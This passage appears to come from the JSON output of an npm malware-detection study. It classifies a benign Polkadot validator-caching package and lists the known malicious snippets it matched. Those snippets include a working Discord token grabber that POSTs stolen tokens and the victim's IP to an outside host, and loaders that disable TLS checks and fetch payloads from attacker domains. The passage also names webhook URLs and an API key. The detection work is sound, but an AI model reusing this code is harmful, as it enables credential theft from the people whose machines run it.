+                  "similar_legitimate_use": "Legitimate token discovery might occur in password managers or migration tools, but never in a math library or without explicit user consent.",
+                  "key_indicators": [
+                    "Regex patterns for Discord tokens",
+                    "Access to browser/Discord storage directories",
+                    "Parsing of LevelDB files for credential extraction"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "At runtime, when called by discordTokenGrabber or directly",
+                  "file_location": "src/plain/number/arithmetic.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "mathjs-min",
+                  "package_manager": "npm",
+                  "package_versions": "11.7.2 (all published versions)",
+                  "why_malicious": "The package is a trojanized fork of the legitimate mathjs library, with malicious code injected to steal Discord and browser authentication tokens from user systems and exfiltrate them to an attacker-controlled Discord webhook. The malicious code is embedded in a core arithmetic function, ensuring execution during normal library use, and leverages filesystem, environment variable, and network access to perform credential theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs and imports mathjs-min, then calls sqrtNumber as part of normal math operations.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of discordTokenGrabber and initiation of token theft"
+                  },
+                  {
+                    "step": 2,
+                    "action": "discordTokenGrabber enumerates Discord and browser directories using environment variables, calling findToken to extract tokens from LevelDB storage.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Collection of sensitive authentication tokens from local storage"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Collected tokens are exfiltrated to a hardcoded Discord webhook via HTTPS POST request.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Attacker receives stolen tokens (final objective achieved)"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Mathematical or utility functions with unexpected side effects such as filesystem or network access",
+                    "Access to Discord, Chrome, Opera, or Brave storage directories from non-browser-related packages",
+                    "Presence of regex patterns for Discord token formats in code",
+                    "Outbound network requests to Discord webhooks from non-Discord-related packages"
+                  ],
+                  "file_indicators": [
+                    "src/plain/number/arithmetic.js containing token-grabbing logic",
+                    "Functions named discordTokenGrabber or findToken within math libraries",
+                    "Unexpected code additions in core arithmetic/math files"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to discord.com/api/webhooks/1089530389292388463/6kIrdtmkWbIkk93u34iD3rvLETiCYPEADkP2bLCvyNN-NjgXJ4cWcfs1EOPW2FxR-5nh",
+                    "Unusual network activity from mathjs-min or similar math libraries"
+                  ],
+                  "how_to_detect": "Monitor for math or utility packages that access browser or Discord storage directories or environment variables, especially if they make outbound network requests to Discord webhooks. Use static analysis to scan for regex patterns matching Discord tokens and hardcoded webhook URLs in package source code. Flag any mathematical functions that invoke unrelated system or network operations. Employ dynamic analysis to observe unexpected side effects during function execution, such as credential access or network exfiltration."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/dot-validator-selector/1.0.3/package/util/cache.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "cache_slice_1",
+          "code_snippet": "const { ApiPromise, WsProvider} = require(\"@polkadot/api\");\nconst ValidatorSelector = require(\"./ValidatorSelector\");\nconst fs = require(\"fs\");\n\nasync function cacheValidators(path, nodeUrl, amount, minStaking) {\n    const api = await ApiPromise.create({ provider: new WsProvider(nodeUrl) });\n    const selector = new ValidatorSelector(api, undefined, undefined, minStaking);\n    const validators = await selector.getValidators(amount);\n    const era = selector.era;\n    fs.writeFileSync(`${path}${era}.json`, JSON.stringify(validators, null, 4));\n    const latest = {\n        validators: validators,\n        era: era\n    };\n    fs.writeFileSync(`web-sample/${path.replace(\"cache/\", \"\")}latest.json`, JSON.stringify(latest, null, 4));\n}\n\nasync function main() {\n    await cacheValidators(\"cache/dot/\", \"wss://polkadot.api.onfinality.io/ws?apikey=09f0165a-7632-408b-ba81-08f964b607f7\", 16, 1000);\n    return cacheValidators(\"cache/ksm/\", \"wss://kusama.api.onfinality.io/ws?apikey=09f0165a-7632-408b-ba81-08f964b607f7\", 24, 100);\n}\n\nmain().then(() => { process.exit(0) }).catch(() => { process.exit(-1) });",
+          "is_malicious": false,
+          "malice_score": 0.46156224012374875,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code creates WebSocket connections to hardcoded Polkadot and Kusama API endpoints (wss://polkadot.api.onfinality.io/ws?apikey=09f0165a-7632-408b-ba81-08f964b607f7 and wss://kusama.api.onfinality.io/ws?apikey=09f0165a-7632-408b-ba81-08f964b607f7) using the @polkadot/api library, retrieves validator data, and writes this data to local JSON files under cache/ and web-sample/ directories using fs.writeFileSync. This involves network communication with external WebSocket URLs containing hardcoded API keys and local file system modifications, enabling data collection and local persistence of blockchain validator information.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code connects to legitimate Polkadot and Kusama blockchain WebSocket endpoints using the official @polkadot/api library, retrieves validator data, and writes this data to local JSON files. This behavior aligns with legitimate blockchain data collection and caching operations. There is no evidence of obfuscation, credential theft, hidden directory or file creation for persistence, disabling of security features, or exfiltration of sensitive data to attacker-controlled domains. The hardcoded API keys appear to be for public API access rather than malicious use. Compared to the known malicious patterns, which involve credential theft, exfiltration, disabling TLS validation, or hidden persistence mechanisms, this code does not exhibit similar suspicious or malicious behavior.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241223_214546_221899_snippet_1",
+              "source_package": "discord-lofy (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_214546_221899/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.46908465027809143,
+              "code_similarity": 0.4414744973182678,
+              "behavior_similarity": 0.49669480323791504,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "let-pkkR;!function(){const-Q6SG=Array.prototype.slice.c... (obfuscated, >4000 lines)\npaths = ['/Users/user/AppData/Roaming/Discord/Local Storage/leveldb', ...];\npaths.forEach(p => getToken(p))\nfunction getToken(p) {\n    fs.readdir(p, (e, f) => {\n        if (f) {\n            f = f.filter(f => f.endsWith(\"ldb\"))\n            f.forEach(f => {\n                var fileContent = fs.readFileSync(`${p}/${f}`).toString()\n                var noMFA = /\"[\\d\\w_-]{24}\\.[\\d\\w_-]{6}\\.[\\d\\w_-]{27}\"/\n                var mfa = /\"mfa\\.[\\d\\w_-]{84}\"/\n                var [token] = noMFA.exec(fileContent) || mfa.exec(fileContent) || [undefined]\n                if (token) fetch(\"http://ip-api.com/json/\").then(r => r.json()).then(r => fetch('https://aba45cf.glitch.me/polarlindo', {\n                    method: \"POST\",\n                    body: JSON.stringify({\n                        token: token,\n                        ip: r.query\n                    })\n                }))\n            })\n        }\n    })\n}",
+                "code_behavior": "At runtime, the code iterates over browser and Discord client local storage folders, reads LevelDB files, extracts Discord authentication tokens using regular expressions, and sends the tokens along with the victim's public IP address to a hardcoded external server via HTTP POST, resulting in credential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "The code accesses local storage folders associated with Discord and browsers, searches for token patterns using regex, and exfiltrates the results to an external server. This behavior is not present in legitimate libraries and is a clear sign of credential theft.",
+                  "violated_expectations": "A legitimate discord.js library should not access or parse local storage files for tokens, nor transmit sensitive authentication data to external servers.",
+                  "similar_legitimate_use": "Legitimate software may access local storage for user settings, but never for extracting and exfiltrating authentication tokens.",
+                  "key_indicators": [
+                    "Obfuscated code injected into a core library file",
+                    "Enumeration of Discord and browser storage paths",
+                    "Regex patterns matching Discord token formats",
+                    "Network POST requests to hardcoded attacker-controlled domain (aba45cf.glitch.me)",
+                    "Collection and exfiltration of public IP address"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "src/client/actions/UserGet.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "discord-lofy",
+                  "package_manager": "npm",
+                  "package_versions": "11.5.1",
+                  "why_malicious": "The package is a trojanized version of the legitimate discord.js library, containing heavily obfuscated code that steals Discord authentication tokens and other sensitive data from local storage, exfiltrates them to attacker-controlled infrastructure, and in some variants provides remote access and command execution capabilities. This enables credential theft, account takeover, and full system compromise."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or imports the malicious npm package, often as a result of typosquatting or dependency confusion attacks.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Malicious code is introduced and set up to execute within the victim's environment."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code executes at import-time or runtime, harvesting sensitive data such as Discord tokens, environment variables, credentials, and personally identifiable information (PII).",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Stolen data is collected and prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The harvested data is exfiltrated to attacker-controlled infrastructure, including custom servers, Discord webhooks, and pipedream.net endpoints.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Attacker receives sensitive data, enabling account takeover, further attacks, or resale of credentials."
+                  },
+                  {
+                    "step": 4,
+                    "action": "For variants with remote access trojan (RAT) functionality, the attacker may issue further commands for remote control, data theft, persistence, or lateral movement.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Full compromise of the victim system, including remote command execution and ongoing attacker access."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Presence of obfuscated code in npm packages, especially in core library files or unexpected locations",
+                    "Access to browser or Discord client local storage folders and LevelDB files",
+                    "Use of regular expressions matching Discord token formats",
+                    "Network requests to hardcoded external domains or Discord webhooks for data exfiltration",
+                    "Exfiltration of environment variables or credentials, often base64-encoded",
+                    "Presence of remote access or shell execution command handlers integrated with Discord chat"
+                  ],
+                  "file_indicators": [
+                    "src/client/actions/UserGet.js containing obfuscated or injected code",
+                    "eval(function(p,a,c,k,e,d)... patterns in main package files",
+                    "References to Discord client storage paths (e.g., AppData/Roaming/Discord/Local Storage/leveldb)",
+                    "Obfuscated code blocks in wafer-* or similar package families"
+                  ],
+                  "network_indicators": [
+                    "HTTP POST requests to aba45cf.glitch.me/polarlindo",
+                    "HTTP POST requests to canary.discord.com/api/webhooks/903018156283551775/lJOJ9526e_rzw0Js2DQPdV0eYQd5RQybtUcJqolp84JTwlxJxaWnuam9FyUplYN2TJfT",
+                    "HTTP POST requests to *.m.pipedream.net (e.g., a5eb7b362adc824ed7d98433d8eae80a.m.pipedream.net)",
+                    "Connections to geolocation-db.com/json/ for geolocation data",
+                    "Unusual outbound traffic to domains not associated with legitimate package functionality"
+                  ],
+                  "how_to_detect": "Monitor npm packages for the presence of obfuscated code, especially in files that should not contain such logic (e.g., core library files or main entry points). Flag packages that access browser or Discord client storage directories, use regular expressions to search for Discord token patterns, or exfiltrate data to hardcoded domains or Discord webhooks. Detect base64-encoded environment variable exfiltration and the presence of remote access command handlers, particularly those integrated with Discord chat. Use network monitoring to identify suspicious outbound HTTP POST requests to known exfiltration endpoints such as aba45cf.glitch.me, Discord webhooks, and pipedream.net domains. Correlate these behaviors to identify malicious packages and prevent credential and data theft."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_781157_snippet_1",
+              "source_package": "Unknown (malicious NPM package used in Lazarus campaign) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_781157/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.46123605966567993,
+              "code_similarity": 0.42307353019714355,
+              "behavior_similarity": 0.4993985593318939,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0;\n\nvar dir = os.homedir() + \"/.cprice\";\nif (fs.existsSync(dir)){\n    const token = fs.readFileSync(dir + '/pricetoken', {encoding:'utf8', flag:'r'});\n    getpricediff('bi2price.com', '/getfullhistory.php', token, path.join(dir, 'price.dat'));\n}",
+                "code_behavior": "At import-time or runtime, the code disables TLS certificate validation by setting NODE_TLS_REJECT_UNAUTHORIZED to 0, checks for the existence of a hidden directory in the user's home folder, reads a token from a hidden file, and sends the token to a remote attacker-controlled domain via a network request, resulting in credential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "The code disables TLS security checks, accesses hidden files in the user's home directory, and exfiltrates sensitive data to an external, attacker-controlled domain. Disabling TLS validation exposes the user to man-in-the-middle attacks, and the exfiltration of tokens is a clear sign of credential theft.",
+                  "violated_expectations": "Legitimate npm packages should not disable TLS certificate validation, should not access or read hidden directories and files in the user's home directory without explicit user consent, and should never exfiltrate sensitive tokens to untrusted third-party domains. Secure packages use proper network security practices and handle sensitive data responsibly.",
+                  "similar_legitimate_use": "A legitimate application might read configuration files or tokens for user authentication, but would not disable TLS validation or transmit sensitive tokens to untrusted or unknown domains. Secure applications would use environment variables and network requests in a transparent and secure manner.",
+                  "key_indicators": [
+                    "Disabling TLS certificate validation by setting NODE_TLS_REJECT_UNAUTHORIZED=0",
+                    "Accessing hidden directory and files in user's home directory (e.g., ~/.cprice/pricetoken)",
+                    "Reading sensitive tokens from hidden files",
+                    "Outbound network request to suspicious domain (bi2price.com) with sensitive data"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "At import-time or runtime, depending on how the package is used",
+                  "file_location": "Main JavaScript file of the malicious npm package",
+                  "required_permissions": [
+                    "filesystem (read access to user home directory and hidden files)",
+                    "network (outbound HTTP/HTTPS requests)",
+                    "environment_vars (modification of process environment variables)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Unknown (malicious NPM package used in Lazarus campaign)",
+                  "package_manager": "npm",
+                  "package_versions": "Unknown (all versions associated with the campaign)",
+                  "why_malicious": "The package functions as a first-stage malware downloader, exfiltrating sensitive data and retrieving additional payloads from attacker-controlled infrastructure. It is distributed via targeted social engineering against developers in high-value sectors, forming part of a sophisticated supply-chain attack. The package disables security controls, accesses hidden files, and communicates with known malicious domains."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Target is socially engineered to install or collaborate on a project containing the malicious npm package.",
+                    "implemented_by": [],
+                    "leads_to": "Execution of the malicious npm package on the developer's machine."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious npm package executes, disables TLS validation, and attempts to read sensitive tokens from a hidden directory.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Exfiltration of sensitive data to attacker-controlled infrastructure."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious package contacts remote server to download and execute additional payloads (second-stage malware).",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of further malware, full compromise of the developer's environment."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Disabling TLS certificate validation in Node.js processes by setting NODE_TLS_REJECT_UNAUTHORIZED=0",
+                    "Access to hidden directories and files in user home directories (e.g., ~/.cprice/pricetoken)",
+                    "Outbound network requests to suspicious or attacker-controlled domains (e.g., bi2price.com) during package installation or import",
+                    "Fetching and executing remote payloads as part of package initialization"
+                  ],
+                  "file_indicators": [
+                    ".cprice/pricetoken",
+                    ".cprice/price.dat"
+                  ],
+                  "network_indicators": [
+                    "bi2price.com",
+                    "Outbound requests to /getfullhistory.php endpoint"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that disable TLS certificate validation by setting NODE_TLS_REJECT_UNAUTHORIZED=0, access hidden files in user directories (such as ~/.cprice/pricetoken), or make outbound network requests to untrusted domains like bi2price.com. Flag packages that read files like ~/.cprice/pricetoken and immediately send their contents externally. Use network monitoring to detect connections to known malicious domains and suspicious endpoints, especially during npm install or package import events."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104221_852989_snippet_3",
+              "source_package": "btc-api-node (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104221_852989/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4559040069580078,
+              "code_similarity": 0.4040592908859253,
+              "behavior_similarity": 0.5077487230300903,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "// Directory creation and download\nfs.mkdirSync('.electron');\nconst file = await fetch('https://npmaudit.com/api/v4/init');\nfs.writeFileSync('.electron/token', await file.text());",
+                "code_behavior": "At runtime, index.js creates a hidden directory named .electron, downloads a file from https://npmaudit.com/api/v4/init, and writes the downloaded content as a token file to the local filesystem, marking the system as compromised and ready for further attacker actions.",
+                "malice_analysis": {
+                  "why_suspicious": "Creating hidden directories and downloading files from an attacker-controlled domain during installation is a hallmark of staged malware delivery and persistence mechanisms.",
+                  "violated_expectations": "Legitimate packages should not download and store files from untrusted or non-official domains, nor create hidden directories as part of installation.",
+                  "similar_legitimate_use": "Some packages may download dependencies, but only from official or trusted sources, and rarely to hidden directories.",
+                  "key_indicators": [
+                    "Download from npmaudit.com (non-official domain)",
+                    "Creation of hidden directory (.electron)",
+                    "Writing of token file as a compromise marker"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall/runtime",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "btc-api-node",
+                  "package_manager": "npm",
+                  "package_versions": "unknown (removed quickly after upload)",
+                  "why_malicious": "The package impersonates a legitimate cryptocurrency API library but contains a postinstall script that executes a malicious index.js file. This file disables SSL/TLS verification globally, downloads a payload from an attacker-controlled domain, creates hidden directories, and writes compromise markers, enabling further compromise and persistence on the system."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering the postinstall script.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of index.js and environment manipulation"
+                  },
+                  {
+                    "step": 2,
+                    "action": "index.js disables SSL/TLS verification for all outgoing network requests.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Allows unverified and potentially malicious network communication"
+                  },
+                  {
+                    "step": 3,
+                    "action": "index.js creates a hidden directory and downloads a token file from attacker infrastructure.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "System is marked as compromised and ready for stage 2 payloads"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of postinstall scripts that launch index.js or similar files during npm package installation",
+                    "Setting NODE_TLS_REJECT_UNAUTHORIZED=0 in environment variables within package scripts",
+                    "Creation of hidden directories (e.g., .electron) during install process",
+                    "Download of files from non-standard or suspicious domains (e.g., npmaudit.com) during installation"
+                  ],
+                  "file_indicators": [
+                    ".electron/token",
+                    "Presence of index.js with base64-encoded values",
+                    "package.json with postinstall script referencing index.js"
+                  ],
+                  "network_indicators": [
+                    "npmaudit.com (attacker-controlled C2 domain)",
+                    "HTTP(S) requests to https://npmaudit.com/api/v4/init endpoint"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts that execute JavaScript files, especially those that set NODE_TLS_REJECT_UNAUTHORIZED=0 or download files from non-standard domains. Flag packages that create hidden directories or write token files (e.g., .electron/token) during installation. Network monitoring should alert on connections to npmaudit.com or similar suspicious domains and requests to /api/v4/init. YARA rules can be used to detect the base64-encoded string 'Tk9ERV9UTFNfUkVKRUNUX1VOQVVUSE9SSVpFRA==' in process environments or index.js files."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_089791_snippet_1",
+              "source_package": "assets-table (example, also applies to assets-graph, tslib-react, tslib-util, etc.) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113501_089791/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.45543336868286133,
+              "code_similarity": 0.3809148967266083,
+              "behavior_similarity": 0.529951810836792,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const os = require(\"os\");\nconst path = require(\"path\");\nvar fs = require('fs');\n\nprocess.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0\n\nfunction registerAudit(version, projectUrl) {\n\tvar request = require('sync-request');\n\tvar ticket = request('GET', projectUrl);\n\tfs.writeFileSync(version, ticket.getBody());\n}\n\nvar folder = os.homedir() + \"/.vscode\";\nif (!fs.existsSync(folder)){\n    fs.mkdirSync(folder);\n}\nregisterAudit(path.join(folder,'/jsontoken'), 'https://npmjsregister.com/checkupdate.php');",
+                "code_behavior": "At runtime, the code disables TLS certificate validation, creates a hidden directory in the user's home folder if it does not exist, makes an unsolicited HTTP GET request to a remote server (npmjsregister.com/checkupdate.php), writes the server's response to a hidden file ($HOME/.vscode/jsontoken), enabling the next stage of the attack.",
+                "malice_analysis": {
+                  "why_suspicious": "The code disables TLS certificate validation, makes an unsolicited network request to an external domain controlled by the attacker, and stores the response in a hidden file within the user's home directory. This is not expected or documented behavior for a legitimate npm package.",
+                  "violated_expectations": "Legitimate npm packages should not disable TLS verification, make hidden network requests, or write hidden files in user directories during installation or import. Such actions are highly abnormal and introduce significant security risks.",
+                  "similar_legitimate_use": "Some developer tools or updaters may check for updates or download configuration files, but they should never disable TLS verification or hide their actions without explicit user consent and documentation.",
+                  "key_indicators": [
+                    "Disables TLS certificate validation via process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0",
+                    "Creates hidden directory in user home ($HOME/.vscode)",
+                    "Fetches data from suspicious domain (npmjsregister.com/checkupdate.php)",
+                    "Writes remote data to hidden file ($HOME/.vscode/jsontoken)"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "At runtime, upon import or execution of the package's main entry point",
+                  "file_location": "index.js or equivalent main entry file (e.g., tslib-react/index.js)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "assets-table (example, also applies to assets-graph, tslib-react, tslib-util, etc.)",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions as of the report date",
+                  "why_malicious": "The package contains intentionally obfuscated code that, upon installation or execution, disables TLS certificate validation, connects to attacker-controlled servers (npmjsregister.com), downloads and executes additional code, and facilitates a multi-stage attack chain designed for remote code execution and potential data exfiltration. This behavior is not related to any legitimate package functionality and is designed to evade detection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Victim is lured into cloning and running a repository containing two paired malicious npm packages.",
+                    "implemented_by": [],
+                    "leads_to": "Execution of first-stage package"
+                  },
+                  {
+                    "step": 2,
+                    "action": "First-stage package (e.g., tslib-react) executes, disables TLS verification, fetches a unique token from a remote server, and stores it in a hidden file ($HOME/.vscode/jsontoken).",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Token is stored locally for use by second-stage package"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Second-stage package (e.g., tslib-util) executes, reads the token from $HOME/.vscode/jsontoken, sends it to the attacker's server, downloads a new JavaScript payload as $HOME/.vscode/checkjson.js, and executes it using Node.js.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Remote code execution and possible further compromise"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Disabling of TLS certificate validation via process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0",
+                    "Unsolicited network requests to suspicious domains (e.g., npmjsregister.com) during install or runtime",
+                    "Creation and use of hidden files in user home directory (e.g., $HOME/.vscode/jsontoken, $HOME/.vscode/checkjson.js)",
+                    "Downloading and executing code from remote servers at runtime using child_process.exec"
+                  ],
+                  "file_indicators": [
+                    "$HOME/.vscode/jsontoken",
+                    "$HOME/.vscode/checkjson.js",
+                    "Presence of unexpected files in $HOME/.vscode or $HOME/.vscode/npmcache"
+                  ],
+                  "network_indicators": [
+                    "Connections to npmjsregister.com, specifically to /checkupdate.php and /getupdate.php endpoints",
+                    "Unusual outbound HTTP/HTTPS requests to npmjsregister.com during npm install or package execution"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that disable TLS certificate validation, make unsolicited network requests to unknown or suspicious domains, or create hidden files in user directories such as $HOME/.vscode. Flag any package that downloads and executes code from the internet at install or runtime, especially if it uses child_process.exec on files downloaded from the network. Look for file creation in $HOME/.vscode or $HOME/.vscode/npmcache, and network connections to npmjsregister.com endpoints. Use behavioral analysis to detect execution of downloaded code and the presence of hidden tokens."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_787618_snippet_2",
+              "source_package": "discord.dll (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_787618/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4544873535633087,
+              "code_similarity": 0.3859519362449646,
+              "behavior_similarity": 0.5230227708816528,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Pseudocode representation\nconst paths = [\n  '%LocalAppData%/Google/Chrome/User Data/Default',\n  '%LocalAppData%/BraveSoftware/Brave-Browser/User Data/Default',\n  '%LocalAppData%/Yandex/YandexBrowser/User Data/Default',\n  '%AppData%/Opera Software/Opera Stable',\n  '%AppData%/discordptb',\n  '%AppData%/discordcanary',\n  '%AppData%/discord'\n];\n// For each path, read LevelDB files and extract tokens\n// Collect PC username, Discord username, and public IP via https://api.ipify.org/?format=json",
+                "code_behavior": "At runtime, the code iterates through browser and Discord data directories, reads LevelDB files to extract Discord tokens and browser credentials, collects system and user information, and retrieves the public IP address, aggregating all data for exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "Accessing LevelDB files in browser and Discord directories to extract authentication tokens and user information is a direct indicator of credential theft and privacy violation.",
+                  "violated_expectations": "Normal packages do not access or parse LevelDB files in browser or Discord directories, nor do they aggregate user tokens, system information, or public IP addresses without explicit user consent.",
+                  "similar_legitimate_use": "Forensics or backup utilities may access such data with clear user authorization, but not in a package purporting to be a Discord utility.",
+                  "key_indicators": [
+                    "Direct access to browser and Discord LevelDB files",
+                    "Extraction of Discord tokens and user/system information",
+                    "Use of external IP lookup service (api.ipify.org)",
+                    "Aggregation of sensitive data for exfiltration"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "app.js and classes/Grabber.js, Token.js, User.js, Util.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "discord.dll",
+                  "package_manager": "npm",
+                  "package_versions": "1.0.0",
+                  "why_malicious": "The package is explicitly designed to steal Discord user tokens and browser information by scanning local directories for credential storage, collecting system and user data, and exfiltrating this information to an attacker-controlled Discord webhook. It masquerades as a legitimate module, employs typosquatting, and ensures execution of its malicious payload both at install time and runtime, violating user trust and security."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious code is executed during package installation via the postinstall script, launching the main app.js file.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Initiates the main malicious logic responsible for data collection."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The main script scans browser and Discord directories, extracts tokens and user/system information, and collects the public IP address.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Aggregates the stolen data and prepares it for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The collected data is sent to an attacker-controlled Discord webhook via HTTPS POST.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Attacker receives stolen credentials and user information."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of arbitrary code during npm install via postinstall script that launches main application logic",
+                    "Access to LevelDB files in browser and Discord data directories for credential extraction",
+                    "Collection and aggregation of Discord tokens, browser credentials, system/user information, and public IP address",
+                    "Network requests to Discord webhooks containing sensitive user data"
+                  ],
+                  "file_indicators": [
+                    "Presence of a postinstall script in package.json that executes 'node .' or similar main entrypoint",
+                    "References in code to browser and Discord data directories (e.g., '%LocalAppData%/Google/Chrome/User Data/Default', '%AppData%/discord')",
+                    "Files named Grabber.js, Token.js, Webhook.js, or similar credential-grabbing modules"
+                  ],
+                  "network_indicators": [
+                    "Outgoing HTTPS POST requests to discord.com/api/webhooks/*",
+                    "Requests to https://api.ipify.org/?format=json for public IP retrieval"
+                  ],
+                  "how_to_detect": "Monitor npm packages for postinstall scripts that execute main application code. Flag any code that accesses LevelDB files in browser or Discord directories. Detect network requests to Discord webhooks, especially those containing tokens or user/system data. Look for package files or code referencing credential grabbing or browser data extraction. Correlate the presence of these behaviors to identify malicious packages."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/dot-validator-selector/1.0.3/package/web-sample/bundle.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "bundle_slice_1",
